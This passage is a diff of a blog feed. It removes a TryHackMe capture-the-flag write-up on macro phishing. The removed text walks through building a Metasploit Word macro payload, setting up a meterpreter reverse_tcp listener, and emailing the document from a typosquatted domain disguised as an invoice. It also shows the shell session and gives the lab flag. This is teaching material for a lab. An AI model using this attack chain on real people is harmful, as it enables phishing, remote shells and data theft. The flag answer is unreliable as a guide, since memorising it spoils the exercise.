-   <span class="o">**</span><span class="nx">DisablePayloadHandler</span><span class="p">:</span> <span class="nc">True   </span><span class="p">(</span><span class="nx">no</span> <span class="nx">handler</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">created</span><span class="o">!</span><span class="p">)</span><span class="o">**</span>
-
-
-<span class="nx">Exploit</span> <span class="nx">target</span><span class="p">:</span>
-
-   <span class="nx">Id</span>  <span class="nx">Name</span>
-   <span class="o">--</span>  <span class="o">----</span>
-   <span class="mi">0</span>   <span class="nx">Microsoft</span> <span class="nx">Office</span> <span class="nx">Word</span> <span class="nx">on</span> <span class="nx">Windows</span>
-
-
-<span class="nx">View</span> <span class="nx">the</span> <span class="nx">full</span> <span class="nx">module</span> <span class="nx">info</span> <span class="kd">with</span> <span class="nx">the</span> <span class="nx">info</span><span class="p">,</span> <span class="nx">or</span> <span class="nx">info</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">command</span><span class="p">.</span>
-
-<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exploit</span>
-
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Using</span> <span class="nx">template</span><span class="p">:</span> <span class="o">/</span><span class="nx">opt</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">embedded</span><span class="o">/</span><span class="nx">framework</span><span class="o">/</span><span class="nx">data</span><span class="o">/</span><span class="nx">exploits</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="o">/</span><span class="nx">template</span><span class="p">.</span><span class="nx">docx</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Injecting</span> <span class="nx">payload</span> <span class="k">in</span> <span class="nb">document</span> <span class="nx">comments</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Injecting</span> <span class="nx">macro</span> <span class="nx">and</span> <span class="nx">other</span> <span class="nx">required</span> <span class="nx">files</span> <span class="k">in</span> <span class="nb">document</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Finalizing</span> <span class="nx">docm</span><span class="p">:</span> <span class="nx">msf</span><span class="p">.</span><span class="nx">docm</span>
-<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">msf</span><span class="p">.</span><span class="nx">docm</span> <span class="nx">stored</span> <span class="nx">at</span> <span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="p">.</span><span class="nx">msf4</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">msf</span><span class="p">.</span><span class="nx">docm</span>
-<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exit</span>
-</code></pre></div></div>
-
-<p>As you can see, the Word document with the embedded macro was created and stored in <code class="language-plaintext highlighter-rouge">/root/.msf4/local/msf.docm</code>.</p>
-
-<h2 id="the-created-macro-enabled-document">The Created Macro-Enabled Document</h2>
-
-<p>We mentioned earlier how to create a macro within an MS Word document. You might be interested to see the content of the file created by <code class="language-plaintext highlighter-rouge">msfconsole</code>. In the screenshot below, we can see the different procedures and functions that make up this macro. <strong>Note:</strong>The AttackBox doesn’t have MS Office installed, so for this section you only have to read along. \n</p>
-
-<ol>
-  <li><code class="language-plaintext highlighter-rouge">AutoOpen()</code> triggers the macro automatically when a Word document is opened. It searches through the document’s properties, looking for content in the “Comments” field. The data saved using <code class="language-plaintext highlighter-rouge">base64</code> encoding in the Comments field is actually the payload.</li>
-  <li><code class="language-plaintext highlighter-rouge">Base64Decode()</code> converts the payload to its original form. In this case, it is an executable MS Windows file.</li>
-  <li><code class="language-plaintext highlighter-rouge">ExecuteForWindows()</code> executes the payload in a temporary directory. It connects to the specified attacker’s system IP address and port.</li>
-</ol>
-
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1729859885481.png" alt="Example macro code with functions and subroutines" /> \n</p>
-
-<p>The <strong>Comments</strong> field is shown in the screenshot below. It is close to 100,000 characters in our case.</p>
-
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1729859926077.png" alt="The Comments field in an MS Office document" /> \n</p>
-
-<p>If you copy it and save it to a text file, you can convert it to its original executable format using <code class="language-plaintext highlighter-rouge">base64</code> as shown below. You can notice the size of the files.</p>
-
-<p>AttackBox Terminal</p>
-
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">AttackBox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">base64</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">payload</span><span class="o">-</span><span class="nx">base64</span><span class="p">.</span><span class="nx">txt</span> <span class="o">&gt;</span> <span class="nx">payload</span><span class="p">.</span><span class="nx">exe</span>
-<span class="nx">root</span><span class="p">@</span><span class="nd">attackbox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">ls</span> <span class="o">-</span><span class="nx">lh</span>
-<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="p">.</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">97</span><span class="nx">K</span> <span class="nx">payload</span><span class="o">-</span><span class="nx">base64</span><span class="p">.</span><span class="nx">txt</span>
-<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="p">.</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">73</span><span class="nx">K</span> <span class="nx">payload</span><span class="p">.</span><span class="nx">exe</span>
-</code></pre></div></div>
-
-<p>You already expect this file to connect to the specified IP address and port. If you would like to check its behaviour in a sandbox, you can check the <a href="https://www.virustotal.com/gui/file/ab3f9303460c590c452f0c259a35d50a7a2e7c52a81d4e5a42bb98b365d8ab9b/behavior">VirusTotal report</a> for a file that we created and uploaded. In this case, it attempts to connect to <code class="language-plaintext highlighter-rouge">10.9.18.120</code>.</p>
-
-<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1729859908974.png" alt="VirusTotal summary of the payload behaviour" /> \n</p>
-
-<h2 id="listening-for-incoming-connections">Listening for Incoming Connections</h2>
-
-<p>We again will use the Metasploit Framework, but this time to listen for incoming connections when a target users opens our phishing Word document. This requires the following commands:</p>
-
-<ul>
-  <li>Open a new terminal window and run <code class="language-plaintext highlighter-rouge">msfconsole</code> to start the Metasploit Framework</li>
-  <li><code class="language-plaintext highlighter-rouge">use multi/handler</code> to handle incoming connections</li>
-  <li><code class="language-plaintext highlighter-rouge">set payload windows/meterpreter/reverse_tcp</code>to ensure that our payload works with the payload used when creating the malicious macro \n</li>
-  <li><code class="language-plaintext highlighter-rouge">set LHOST CONNECTION_IP</code> specifies the IP address of the attacker’s system and should be the same as the one used when creating the document</li>
-  <li><code class="language-plaintext highlighter-rouge">set LPORT 8888</code> specifies the port number you are going to listen on and should be the same as the one used when creating the document</li>
-  <li><code class="language-plaintext highlighter-rouge">show options</code> to confirm the values of your options</li>
-  <li><code class="language-plaintext highlighter-rouge">exploit</code> starts listening for incoming connections to establish a reverse shell</li>
-</ul>
-
-<p>AttackBox Terminal</p>
-
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">AttackBox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">msfconsole</span>
-<span class="p">[...]</span>
-<span class="nx">Metasploit</span> <span class="nx">Documentation</span><span class="p">:</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//docs.metasploit.com/</span>
-
-<span class="nx">msf6</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Using</span> <span class="nx">configured</span> <span class="nx">payload</span> <span class="nx">generic</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span>
-<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
-<span class="nx">payload</span> <span class="o">=&gt;</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
-<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LHOST</span> <span class="nx">CONNECTION_IP</span>
-<span class="nx">LHOST</span> <span class="o">=&gt;</span> <span class="nx">CONNECTION_IP</span>
-<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LPORT</span> <span class="mi">8888</span>
-<span class="nx">LPORT</span> <span class="o">=&gt;</span> <span class="mi">8888</span>
-<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>
-
-<span class="nx">Module</span> <span class="nf">options </span><span class="p">(</span><span class="nx">exploit</span><span class="o">/</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">):</span>
-
-   <span class="nx">Name</span>  <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
-   <span class="o">----</span>  <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
-
-
-<span class="nx">Payload</span> <span class="nf">options </span><span class="p">(</span><span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span><span class="p">):</span>
-
-   <span class="nx">Name</span>      <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
-   <span class="o">----</span>      <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
-   <span class="nx">EXITFUNC</span>  <span class="nx">process</span>          <span class="nx">yes</span>       <span class="nx">Exit</span> <span class="nf">technique </span><span class="p">(</span><span class="nx">Accepted</span><span class="p">:</span> <span class="dl">''</span><span class="p">,</span> <span class="nx">seh</span><span class="p">,</span> <span class="nx">thread</span><span class="p">,</span> <span class="nx">process</span><span class="p">,</span> <span class="nx">none</span><span class="p">)</span>
-   <span class="nx">LHOST</span>     <span class="nx">CONNECTION_IP</span>    <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nf">address </span><span class="p">(</span><span class="nx">an</span> <span class="kr">interface</span> <span class="nx">may</span> <span class="nx">be</span> <span class="nx">specified</span><span class="p">)</span>
-   <span class="nx">LPORT</span>     <span class="mi">8888</span>             <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nx">port</span>
-
-
-<span class="nx">Exploit</span> <span class="nx">target</span><span class="p">:</span>
-
-   <span class="nx">Id</span>  <span class="nx">Name</span>
-   <span class="o">--</span>  <span class="o">----</span>
-   <span class="mi">0</span>   <span class="nx">Wildcard</span> <span class="nx">Target</span>
-
-
-
-<span class="nx">View</span> <span class="nx">the</span> <span class="nx">full</span> <span class="nx">module</span> <span class="nx">info</span> <span class="kd">with</span> <span class="nx">the</span> <span class="nx">info</span><span class="p">,</span> <span class="nx">or</span> <span class="nx">info</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">command</span><span class="p">.</span>
-
-<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exploit</span>
-
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Started</span> <span class="nx">reverse</span> <span class="nx">TCP</span> <span class="nx">handler</span> <span class="nx">on</span> <span class="nx">CONNECTION_IP</span><span class="p">:</span><span class="mi">8888</span>
-</code></pre></div></div>
-
-<p>\n</p>
-
-<h2 id="email-the-malicious-document">Email the Malicious Document</h2>
-
-<p>The malicious document has been created. All you need to do is to send it to the target user. It is time to send an email to the target user, <code class="language-plaintext highlighter-rouge">marta@socmas.thm</code>. Mayor Malware has prepared the following credentials:</p>
-
-<ul>
-  <li>Email: <code class="language-plaintext highlighter-rouge">info@socnas.thm</code></li>
-  <li>Password: <code class="language-plaintext highlighter-rouge">MerryPhishMas!</code></li>
-</ul>
-
-<p>Notice how Mayor Malware uses a domain name that looks similar to the target user’s. This technique is known as “typosquatting,” where attackers create domain names that are nearly identical to legitimate ones in order to trick victims. On the AttackBox, start the Firefox web browser and head to http://MACHINE_IP. Use the above credentials to log in.</p>
-
-<p>Once logged in, compose an email to the target user, and don’t forget to attach the document you created. Changing the name to something more convincing, such as <code class="language-plaintext highlighter-rouge">invoice.docm</code> or <code class="language-plaintext highlighter-rouge">receipt.docm</code> might be a good idea. Also, write a couple of sentences explaining what you are attaching to convince Marta May Ware to open the document. <strong>Note:</strong> You can use CTRL+H on the file upload pop-up to be able to see the <code class="language-plaintext highlighter-rouge">.msf4</code> directory where our email attachment is located.</p>
-
-<h2 id="exploitation">Exploitation</h2>
-
-<p>If everything works out, you will get a reverse shell after about 2 minutes. You can access the files and folders on the target system via the command line. You can use <code class="language-plaintext highlighter-rouge">cat</code> to display any text file.</p>
-
-<p>AttackBox Terminal</p>
-
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exploit</span>
-
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Started</span> <span class="nx">reverse</span> <span class="nx">TCP</span> <span class="nx">handler</span> <span class="nx">on</span> <span class="nx">CONNECTION_IP</span><span class="p">:</span><span class="mi">8888</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Sending</span> <span class="nf">stage </span><span class="p">(</span><span class="mi">176198</span> <span class="nx">bytes</span><span class="p">)</span> <span class="nx">to</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">103.92</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Meterpreter</span> <span class="nx">session</span> <span class="mi">1</span> <span class="nf">opened </span><span class="p">(</span><span class="nx">CONNECTION_IP</span><span class="p">:</span><span class="mi">8888</span> <span class="o">-&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">103.92</span><span class="p">:</span><span class="mi">52536</span><span class="p">)</span> <span class="nx">at</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">24</span> <span class="mi">16</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">47</span> <span class="o">+</span><span class="mi">0300</span>
-<span class="nx">meterpreter</span> <span class="o">&gt;</span> <span class="nx">cd</span> <span class="nx">c</span><span class="p">:</span><span class="o">/</span><span class="nx">users</span><span class="o">/</span><span class="nx">Administrator</span><span class="o">/</span><span class="nx">Desktop</span>
-<span class="nx">meterpreter</span> <span class="o">&gt;</span> <span class="nx">ls</span>
-<span class="p">[...]</span>
-<span class="nx">meterpreter</span> <span class="o">&gt;</span>
-</code></pre></div></div>
-
-<p>Answer the questions below</p>
-
-<p>What is the flag value inside the <code class="language-plaintext highlighter-rouge">flag.txt</code> file that’s located on the Administrator’s desktop?</p>
-
-<p>THM{PHISHING_CHRISTMAS}</p>
-
-<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/module/phishing">Phishing</a> module.</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day10-logo.svg" /><media:content medium="image" url="http://localhost:4000/Day10-logo.svg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/module/networking">Networking</a> module.</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day11Header.png" /><media:content medium="image" url="http://localhost:4000/Day11Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
